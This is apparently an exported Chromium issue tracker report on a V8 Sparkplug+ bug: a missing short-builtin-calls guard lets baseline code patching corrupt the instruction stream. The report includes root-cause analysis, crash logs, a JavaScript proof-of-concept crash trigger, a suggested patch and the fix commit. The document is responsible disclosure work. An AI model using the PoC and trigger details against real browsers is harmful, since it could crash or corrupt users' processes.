# V8: Instruction Stream Corruption in Sparkplug+ via Missing `is_short_builtin_calls_enabled()` Guard in `Runtime_PatchLoadICUninitializedBaseline`

| Field | Value |
|-------|-------|
| **Issue ID** | [484789568](https://issues.chromium.org/issues/484789568) |
| **Status** | Verified |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Sparkplug |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ca...@gmail.com |
| **Assignee** | le...@chromium.org |
| **Created** | 2026-02-16 |
| **Bounty** | $11,000.00 |

## Description

## VULNERABILITY DETAILS

### Summary

`Runtime_PatchLoadICUninitializedBaseline` in `src/ic/ic.cc` patches baseline code call targets using `Assembler::set_target_address_at()` without checking `isolate->is_short_builtin_calls_enabled()`. This is a missed guard that the two other patching functions (`IC::MaybePatchCode` and `Runtime_MaybePatchBinaryBaselineCode`) both have. On systems where `sparkplug_plus` is enabled but `is_short_builtin_calls_enabled()` returns false at runtime, baseline code is compiled with indirect call encoding, but this function attempts to patch it as if it were a direct branch instruction, causing instruction stream corruption and a crash.

### Overview

The root cause is that `Runtime_PatchLoadICUninitializedBaseline` unconditionally calls `Assembler::target_address_at()` and `Assembler::set_target_address_at()` on the caller's return address, assuming the call site uses PC-relative/direct branch encoding. When `is_short_builtin_calls_enabled()` is false, Sparkplug generates indirect calls (loading the target from a builtin table and performing an indirect call), so the instruction at the patching site is not a direct branch. The assembler functions DCHECK/CHECK that the instruction is a direct branch (BL/B on arm64, relative CALL on x64), causing a crash.

### Detail

The flag implication system ensures that `--sparkplug-plus` implies `--short_builtin_calls`:

```
// src/flags/flag-definitions.h:3144
DEFINE_IMPLICATION(sparkplug_plus, short_builtin_calls)

```

However, the runtime method `is_short_builtin_calls_enabled()` can still return false despite the flag being set:

```
// src/execution/isolate.h:1936-1938
bool is_short_builtin_calls_enabled() const {
  return V8_SHORT_BUILTIN_CALLS_BOOL && is_short_builtin_calls_enabled_;
}

```

The runtime field `is_short_builtin_calls_enabled_` depends on code range proximity to the embedded builtins blob, which is affected by ASLR, heap size constraints (e.g. `--max-old-space-size`), and whether `--no-better-code-range-allocation` is used.

The baseline compiler respects this runtime check when selecting call encoding:

```
// src/baseline/baseline-compiler.cc:254-260
AssemblerOptions BaselineAssemblerOptions(Isolate* isolate) {
  AssemblerOptions options = AssemblerOptions::Default(isolate);
  options.builtin_call_jump_mode =
      isolate->is_short_builtin_calls_enabled()
          ? BuiltinCallJumpMode::kPCRelative
          : kFallbackBuiltinCallJumpModeForBaseline;

```

When `is_short_builtin_calls_enabled()` returns false, baseline code uses indirect calls (e.g. `LDR x17, [x13, #offset]; BLR x17` on arm64, or `call [r13+offset]` on x64) instead of direct calls (`BL target` on arm64, `call rel32` on x64).

The vulnerable function at `src/ic/ic.cc:2984-3031` has NO such guard:

```
// src/ic/ic.cc:2984
RUNTIME_FUNCTION(Runtime_PatchLoadICUninitializedBaseline) {
  // ... argument setup ...

  // NO is_short_builtin_calls_enabled() check here!

  {
    Address pc =
        StackFrame::ReadPC(pc_address) - Assembler::kCallTargetAddressOffset;
    DCHECK_EQ(
        Assembler::target_address_at(pc, kNullAddress),  // CRASHES HERE
        Builtins::EntryOf(Builtin::kLoadICUninitializedBaseline, isolate));
    Assembler::set_target_address_at(pc, kNullAddress, target, &jit_allocation,
                                     FLUSH_ICACHE_IF_NEEDED);
  }

```

Compare with `IC::MaybePatchCode` which has the guard at line 749:

```
// src/ic/ic.cc:744
void IC::MaybePatchCode(Builtin handler) {
  CHECK(v8_flags.sparkplug_plus);
#ifdef V8_ENABLE_SPARKPLUG_PLUS
  if (handler == Builtin::kIllegal) return;
  if (!isolate()->is_short_builtin_calls_enabled()) return;  // GUARD PRESENT
  // ... same patching logic ...

```

And `Runtime_MaybePatchBinaryBaselineCode` which also has the guard at line 812:

```
// src/runtime/runtime-compiler.cc:806
RUNTIME_FUNCTION(Runtime_MaybePatchBinaryBaselineCode) {
  HandleScope scope(isolate);
  CHECK(v8_flags.sparkplug_plus);
  // ...
  if (!isolate->is_short_builtin_calls_enabled()) return *compare_result;  // GUARD PRESENT

```

On arm64, `Assembler::target_address_at()` (`src/codegen/arm64/assembler-arm64-inl.h:494`) checks whether the instruction is a direct branch:

```
Address Assembler::target_address_at(Address pc, Address constant_pool) {
  Instruction* instr = reinterpret_cast<Instruction*>(pc);
  if (instr->IsLdrLiteralX()) {
    return Memory<Address>(target_pointer_address_at(pc));
  } else {
    DCHECK(instr->IsBranchAndLink() || instr->IsUnconditionalBranch());  // line 499

```

When the instruction is an indirect call (not BL/B), the DCHECK fails in debug builds. In release builds, `set_target_address_at` (`src/codegen/arm64/assembler-arm64-inl.h:579`) hits `CHECK failed: is_int26(x)` when trying to encode a branch offset that doesn't fit.

On x64, `Assembler::target_address_at()` (`src/codegen/x64/assembler-x64-inl.h:305`) reads a 32-bit relative offset at the call site:

```
Address Assembler::target_address_at(Address pc, Address constant_pool) {
  return ReadUnalignedValue<int32_t>(pc) + pc + 4;
}

```

When the call site is actually an indirect call (`call [r13+offset]`), reading bytes at the wrong position returns a garbage address. The DCHECK at `ic.cc:3011-3013` fails because the decoded address doesn't match `LoadICUninitializedBaseline`. In release builds, `set_target_address_at` writes a 32-bit value to the wrong location, corrupting the instruction stream and causing SIGSEGV.

### Trigger Conditions

1. `--sparkplug-plus` flag is enabled (enables dynamic baseline code patching)
2. `is_short_builtin_calls_enabled()` returns false at runtime. The runtime field `is_short_builtin_calls_enabled_` is set during isolate initialization based on:
   - `MaxOldGenerationSize() >= kShortBuiltinCallsOldSpaceSizeThreshold` (2GB): Systems with <4GB RAM or `--max-old-space-size=100` fail this check
   - Code range has an embedded builtins copy (with pointer compression): Only exists if the first condition or near-code-range check enabled SBC
   - `V8_ENABLE_NEAR_CODE_RANGE_BOOL` and code range within PC-relative distance of embedded builtins: ARM64 has a 128MB range (easily fails), x64 has a 2GB range (usually succeeds with `better_code_range_allocation`)
   - **ARM64 hardware with <4GB RAM**: `is_short_builtin_calls_enabled()` returns false naturally -- no extra flags needed beyond `--sparkplug-plus`
   - **ARM64 on high-memory systems**: `--max-old-space-size=100` simulates the low-memory condition
   - **x64**: `--max-old-space-size=100 --no-better-code-range-allocation` needed because x64's 2GB PC-relative range with better code range allocation almost always places code near builtins
3. A function with a property load (LoadIC) is compiled by Sparkplug+. The baseline compiler generates a call to `LoadICUninitializedBaseline` (at `src/baseline/baseline-compiler.cc:1047`)
4. The function is executed -- `LoadICUninitializedBaseline` detects that IC feedback is no longer uninitialized and calls `Runtime_PatchLoadICUninitializedBaseline`, which attempts to patch the indirect call as PC-relative, corrupting the instruction stream

## Version

### Reproduced Version

- `main` branch latest commit (2026/02/13): `8c58d3540ec7b329273d0f31366ee0e39641c15e`
- V8 14.7.X

### Bisect

The vulnerability was introduced by the commit that added Sparkplug+ patchable baseline code support:

```
commit 2bf36e101794fe961ac3983fad216708d4254c21
Author: Hao Xu <hao.a.xu@intel.com>
Date:   Tue Nov 4 21:13:40 2025 +0800

    Sparkplug+: support patchable baseline code

    A bytecode handler for an operation is often a generic handler that
    deal with different types of inputs. This make the baseline compiler
    to generate a call to a generic builtin for that operation. The
    generic builtin can deal with all types of inputs, but this makes the
    builtin very large and introduces a lot of branches to distinguish
    inputs' types, which hurts the performance.

    Sparkplug+ introduces some small and specific handlers to deal with
    one single type of input. For example, this CL introduces some small
    monomorphic handlers for builtin LoadIC to deal with one specific
    kind of IC. We will patch the baseline code to use these specific
    handlers on IC misses dynamically.

    Bug: chromium:429351411
    Change-Id: I85f842ae4050eebbdd8d25d5e113deae743c95d0
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6627216
    Commit-Queue: Xu, Hao A <hao.a.xu@intel.com>
    Reviewed-by: Leszek Swirski <leszeks@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#103495}

```

This commit introduced `Runtime_PatchLoadICUninitializedBaseline` without the `is_short_builtin_calls_enabled()` guard, while the other two patching functions (`IC::MaybePatchCode` and `Runtime_MaybePatchBinaryBaselineCode`) added in the same commit already include the guard.

## Reproduction Case

The PoC (`poc.js`) uses `eval()` to create 50 loader functions. This generates many call sites for `LoadICUninitializedBaseline`, maximizing the chance of triggering the patching path. It uses polymorphic object shapes to cause IC transitions.

### Release Build

#### Arm64 (Simulator build)

```
out/arm64.release/d8 --sparkplug-plus --max-old-space-size=100 poc.js

```

Result:

```
#
# Fatal error in , line 0
# Check failed: is_int26(x).
#
#
#
#FailureMessage Object: 0x77b28cb35460
==== C stack trace ===============================

    out/arm64.release/d8(__interceptor_backtrace+0x46) [0x56943ae07b36]
    out/arm64.release/d8(v8::base::debug::StackTrace::StackTrace()+0x34) [0x569440508eb4]
    ...
    out/arm64.release/d8(v8::internal::Runtime_PatchLoadICUninitializedBaseline(int, unsigned long*, v8::internal::Isolate*)+0x8cc) [0x56943bd08c6c]
    ...

```
#### x64

```
out/x64.release/d8 --sparkplug-plus --max-old-space-size=100 --no-better-code-range-allocation poc.js

```

Result:

```
Received signal 11 SEGV_ACCERR 7c4079da2bec

==== C stack trace ===============================

out/x64.release/d8(___interceptor_backtrace+0x46)[0x5ce708956b36]
out/x64.release/d8(_ZN2v84base5debug10StackTraceC1Ev+0x34)[0x5ce70e10ccc4]
out/x64.release/d8(+0x7ce3ab0)[0x5ce70e10cab0]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x7d30e7045330]
[0x79307a30080d]
[end of stack trace]

```
### Debug Build

#### arm64 (Simulator build)

```
out/arm64.debug/d8 --sparkplug-plus --max-old-space-size=100 poc.js

```

Result:

```
#
# Fatal error in ../../src/codegen/arm64/assembler-arm64-inl.h, line 499
# Debug check failed: instr->IsBranchAndLink() || instr->IsUnconditionalBranch().
#
#
#
#FailureMessage Object: 0x6f93a4900c60
==== C stack trace ===============================

    out/arm64.debug/d8(___interceptor_backtrace+0x46) [0x61a126ae8f66]
    /home/candymate/repos/v8-latest/v8/out/arm64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x4d) [0x7393a875524d]
    ...
    /home/candymate/repos/v8-latest/v8/out/arm64.debug/libv8.so(v8::internal::Assembler::target_address_at(unsigned long, unsigned long)+0xb0) [0x7393b4bd7890]
    /home/candymate/repos/v8-latest/v8/out/arm64.debug/libv8.so(v8::internal::Runtime_PatchLoadICUninitializedBaseline(int, unsigned long*, v8::internal::Isolate*)+0x297) [0x7393b6318217]
    ...

```
#### x64

```
out/x64.debug/d8 --sparkplug-plus --max-old-space-size=100 --no-better-code-range-allocation poc.js

```

Result:

```
#
# Fatal error in ../../src/ic/ic.cc, line 3013
# Debug check failed: Assembler::target_address_at(pc, kNullAddress) == Builtins::EntryOf(Builtin::kLoadICUninitializedBaseline, isolate) (134318213886294 vs. 138736569873408).
#
#
#
#FailureMessage Object: 0x7a2e10b00c60
==== C stack trace ===============================

    out/x64.debug/d8(___interceptor_backtrace+0x46) [0x56fa9101db56]
    ...
    /home/candymate/repos/v8-latest/v8/out/x64.debug/libv8.so(v8::internal::Runtime_PatchLoadICUninitializedBaseline(int, unsigned long*, v8::internal::Isolate*)+0x297) [0x7e2e22d009d7]
    ...

```
### PoC Code

```
// PoC: Missing is_short_builtin_calls_enabled() guard in
// Runtime_PatchLoadICUninitializedBaseline (src/ic/ic.cc:2984)
//
// Usage (arm64):
//   d8 --sparkplug-plus --max-old-space-size=100 poc.js
// Usage (x64):
//   d8 --sparkplug-plus --max-old-space-size=100 --no-better-code-range-allocation poc.js

function makeLoader(id) {
  return eval('(function load' + id + '(obj) { return obj.x; })');
}

let loaders = [];
for (let i = 0; i < 50; i++) {
  loaders.push(makeLoader(i));
}

let obj1 = { x: 42 };
let obj2 = { a: 1, x: 99 };
let obj3 = { a: 1, b: 2, x: 200 };
let obj4 = { a: 1, b: 2, c: 3, x: 300 };
let obj5 = { a: 1, b: 2, c: 3, d: 4, x: 400 };

// Phase 1: Warm up all functions to trigger baseline compilation.
for (let fn of loaders) {
  for (let i = 0; i < 2000; i++) fn(obj1);
}

// Phase 2: Call with different shapes -> IC transitions -> crash.
for (let round = 0; round < 200; round++) {
  for (let fn of loaders) {
    fn(obj1); fn(obj2); fn(obj3); fn(obj4); fn(obj5);
  }
}

print("PASS: No crash (is_short_builtin_calls_enabled() was true)");

```
## Suggested Patch

```
diff --git a/src/ic/ic.cc b/src/ic/ic.cc
--- a/src/ic/ic.cc
+++ b/src/ic/ic.cc
@@ -2994,28 +2994,30 @@ RUNTIME_FUNCTION(Runtime_PatchLoadICUninitializedBaseline) {
   FeedbackSlotKind kind = vector->GetKind(vector_slot);

-  // Get target builtin's address.
-  FeedbackNexus nexus(isolate, vector, vector_slot);
-  Builtin target_builtin = nexus.ic_handler();
-  DCHECK(target_builtin > Builtin::kFirstLoadICHandler &&
-         target_builtin <= Builtin::kLastLoadICHandler);
-  Address target = Builtins::EntryOf(target_builtin, isolate);
-
-  {
-    // Get Caller's pc.
-    const Address entry = Isolate::c_entry_fp(isolate->thread_local_top());
-    Address* pc_address =
-        reinterpret_cast<Address*>(entry + ExitFrameConstants::kCallerPCOffset);
-    Address pc =
-        StackFrame::ReadPC(pc_address) - Assembler::kCallTargetAddressOffset;
-    DCHECK_EQ(
-        Assembler::target_address_at(pc, kNullAddress),
-        Builtins::EntryOf(Builtin::kLoadICUninitializedBaseline, isolate));
-    // Patch caller to the target address.
-    WritableJitAllocation jit_allocation =
-        WritableJitAllocation::ForPatchableBaselineJIT(
-            pc, Assembler::kCallTargetAddressOffset);
-    Assembler::set_target_address_at(pc, kNullAddress, target, &jit_allocation,
-                                     FLUSH_ICACHE_IF_NEEDED);
+  if (isolate->is_short_builtin_calls_enabled()) {
+    // Get target builtin's address.
+    FeedbackNexus nexus(isolate, vector, vector_slot);
+    Builtin target_builtin = nexus.ic_handler();
+    DCHECK(target_builtin > Builtin::kFirstLoadICHandler &&
+           target_builtin <= Builtin::kLastLoadICHandler);
+    Address target = Builtins::EntryOf(target_builtin, isolate);
+
+    {
+      // Get Caller's pc.
+      const Address entry = Isolate::c_entry_fp(isolate->thread_local_top());
+      Address* pc_address =
+          reinterpret_cast<Address*>(entry + ExitFrameConstants::kCallerPCOffset);
+      Address pc =
+          StackFrame::ReadPC(pc_address) - Assembler::kCallTargetAddressOffset;
+      DCHECK_EQ(
+          Assembler::target_address_at(pc, kNullAddress),
+          Builtins::EntryOf(Builtin::kLoadICUninitializedBaseline, isolate));
+      // Patch caller to the target address.
+      WritableJitAllocation jit_allocation =
+          WritableJitAllocation::ForPatchableBaselineJIT(
+              pc, Assembler::kCallTargetAddressOffset);
+      Assembler::set_target_address_at(pc, kNullAddress, target, &jit_allocation,
+                                       FLUSH_ICACHE_IF_NEEDED);
+    }
   }

   LoadIC ic(isolate, Handle<FeedbackVector>(), vector_slot, kind);

```

The fix adds the `if (isolate->is_short_builtin_calls_enabled())` guard before the patching block, consistent with the guards already present in `IC::MaybePatchCode` (line 749) and `Runtime_MaybePatchBinaryBaselineCode` (runtime-compiler.cc line 812). When `is_short_builtin_calls_enabled()` is false, the function skips the patching entirely and falls through to the standard LoadIC path, which still correctly handles the property load -- just without the performance benefit of patching the call site. This is safe because the unpatched `LoadICUninitializedBaseline` call site will simply call back into the runtime on the next execution, functioning correctly but slightly slower.

### Credit Information

Reporter credit: JunYoung Park(@candymate) of KAIST Hacking Lab

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 1.0 KB)

## Timeline

### le...@chromium.org (2026-02-16)

Nice find, settings Security\_Impact-None since `--sparkplug-plus` is not enabled.

### ch...@google.com (2026-02-16)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### dx...@google.com (2026-02-17)

Project: v8/v8  

Branch:  main  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7581220>

[sparkplug+] Guard Sparkplug+ on short builtin calls support

---


Expand for full commit details
```
     
    Even though --sparkplug-plus implies --short-builtin-calls, we might 
    still fail to enable short builtin calls dynamically. Guard sparkplug+ 
    in the baseline compiler on this runtime check. 
     
    Fixed: 484789568 
    Change-Id: I95c1c4213798da5a4a2302f2e9013f0a0cdec4b9 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7581220 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Patrick Thier <pthier@chromium.org> 
    Reviewed-by: Patrick Thier <pthier@chromium.org> 
    Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105289}

```

---

Files:

- M `src/baseline/baseline-compiler.cc`
- M `src/baseline/baseline-compiler.h`
- M `src/execution/local-isolate-inl.h`
- M `src/execution/local-isolate.h`
- M `src/ic/ic.cc`

---

Hash: [a1dff89c93400e02819ccc645d3da8e119a568fa](https://chromiumdash.appspot.com/commit/a1dff89c93400e02819ccc645d3da8e119a568fa)  

Date: Tue Feb 17 09:21:53 2026


---

### ch...@google.com (2026-02-17)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels. Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>
  After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ma...@google.com (2026-02-17)

FoundIn based on bisect. Impact\_None means this won't need a merge anyway I think.

### sp...@google.com (2026-03-11)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
High Quality & Bisect. Renderer RCE / memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-27)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/484789568)*
